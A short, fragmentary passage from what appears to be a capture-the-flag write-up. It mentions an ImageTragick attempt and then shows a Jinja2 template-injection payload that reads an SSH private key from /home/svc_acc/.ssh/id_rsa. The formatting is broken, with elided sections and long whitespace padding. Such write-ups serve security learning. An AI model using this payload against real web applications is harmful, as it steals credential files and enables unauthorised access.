...
![](images/late01.png) This lead me down the road of "ImageTragick" trying to inject code with the following string:
...
| Looking for a ssh private key we find `/home/svc_acc/.ssh/id_rsa`. \`\`\`bash \## REQUEST {% raw %}{{get_flashed_messages.\_\_globals\_\_.\_\_builtins\_\_.open("/home/svc_acc/.ssh/id_rsa").read()}}{% endraw %}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
